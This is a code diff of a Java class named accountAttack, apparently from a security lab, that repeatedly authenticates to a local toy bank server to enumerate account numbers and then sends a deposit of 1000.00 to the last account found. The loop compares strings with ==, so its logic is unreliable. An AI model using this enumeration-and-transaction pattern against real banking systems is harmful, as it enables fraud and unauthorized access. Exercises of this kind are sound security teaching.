@@ -43,14 +43,13 @@ public class accountAttack {
     public PublicKey publicKey;
     public SecretKey operationKey;
 	public String account;
-    public String response;
+    public String response = "130";
 	public Socket socket;
 	public MBeC mb;
 
     public accountAttack() throws Exception{
 
 
-		this.socket = new Socket("127.0.0.1", 3000);
 		this.mb = new MBeC();
         setArgs();
         loop();
@@ -70,18 +69,31 @@ public class accountAttack {
 
         int account = 0; 
 
-        while (this.response != "130") {
+        while (this.response == "130") {
             String req = "-g " + account;
-            ObjectInputStream in = new ObjectInputStream(this.socket.getInputStream());
+			this.socket = new Socket("127.0.0.1", 3000);
             ObjectOutputStream out = new ObjectOutputStream(this.socket.getOutputStream());
+            ObjectInputStream in = new ObjectInputStream(this.socket.getInputStream());
 
             authenticate(out,in);
             sendRequest(req,in,out);
-			System.out.println(account);
+			System.out.println("Account is " + account + " Response is " + this.response);
             account++;
+
+			in.close();
+			out.close();
         }
 
         System.out.println(this.response);
+
+		String req = "-d " + (account-1) + " 1000.00";
+		this.socket = new Socket("127.0.0.1", 3000);
+		ObjectOutputStream out = new ObjectOutputStream(this.socket.getOutputStream());
+		ObjectInputStream in = new ObjectInputStream(this.socket.getInputStream());
+
+        authenticate(out,in);
+        sendRequest(req,in,out);
+
 
     }
 
